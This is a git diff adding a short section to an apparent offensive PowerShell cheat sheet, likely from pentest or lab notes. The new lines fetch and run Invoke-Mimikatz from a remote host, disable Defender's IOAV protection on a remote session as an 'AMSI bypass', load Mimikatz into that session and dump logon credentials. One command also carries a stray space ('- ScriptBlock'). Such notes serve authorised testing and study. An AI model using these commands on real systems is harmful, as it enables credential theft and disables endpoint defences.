@@ -333,6 +333,19 @@ Invoke-Command -Scriptblock {whoami} $sess
 Invoke-Command -Computername <computername> -FilePath <path>
 Invoke-Command -FilePath <path> $sess
 ```
+### Host Script Locally and execute on remote system via PS Remoting 
+```powershell
+##Load Mimikatz on host machine
+iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
+##Enter PSRemoting session for target host 
+$sess = New-PSSession -ComputerName host
+##Bypass AMSI (if administrator)
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+##Load mimikatz
+Invoke-command - ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+##dump creds
+sekurlsa::logonpasswords
+```
 Windows Remote Management ([winrs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs))
 
 ```powershell 
